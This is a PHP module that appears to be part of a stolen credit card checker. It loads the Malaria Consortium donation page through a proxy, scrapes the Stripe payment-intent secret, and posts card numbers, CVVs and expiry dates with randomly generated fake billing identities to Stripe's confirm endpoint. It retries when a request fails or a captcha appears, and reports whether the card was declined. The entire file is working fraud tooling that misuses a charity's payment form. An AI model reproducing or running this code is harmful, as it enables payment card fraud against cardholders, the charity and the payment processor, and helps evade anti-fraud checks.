<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://www.malariaconsortium.org/pages/support-us/donate-usa.htm', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$pi_secret = $this->getstr($r1->body, 'type="hidden" name="g-s-s" value="', '"');

$pi_id = explode('_secret_', $pi_secret)[0];

if (empty($pi_id)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$data = 'receipt_email='.$fake->email.'&payment_method_data[type]=card&payment_method_data[billing_details][name]='.$fake->first.'+'.$fake->last.'&payment_method_data[billing_details][email]='.$fake->email.'&payment_method_data[billing_details][address][line1]='.$fake->street.'&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][city]='.$fake->city.'&payment_method_data[billing_details][address][state]='.$fake->state.'&payment_method_data[billing_details][address][country]=US&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_year]='.$yy.'&payment_method_data[card][exp_month]='.$mm.'&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[payment_user_agent]=stripe.js%2F5b37d8a1b0%3B+stripe-js-v3%2F5b37d8a1b0&payment_method_data[time_on_page]='.rand(50000, 100000).'&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_d9qHHgG4tBeLUGV2mktahOiq00aMR5e72C&client_secret='.$pi_secret;

$r2 = $this->curlx->Post('https://api.stripe.com/v1/payment_intents/'.$pi_id.'/confirm', $data, null, $cookie, $server['proxy']);

if (!$r2->success) {
	$empty = ''.$r2->error.'! ('.intval($r2->errno).')';

	goto start;
}

if (strpos($r2->body, 'verify_challenge') !== false) {
	$empty = 'Second Request Contains HCaptcha!';

	goto start;
}

$json_r2 = json_decode($r2->body);

if (isset($json_r2->error)) {
	$status = $this->response->ErrorHandler($json_r2->error);

	goto end;
}

$status = $this->response->Stripe($r2->body);

end: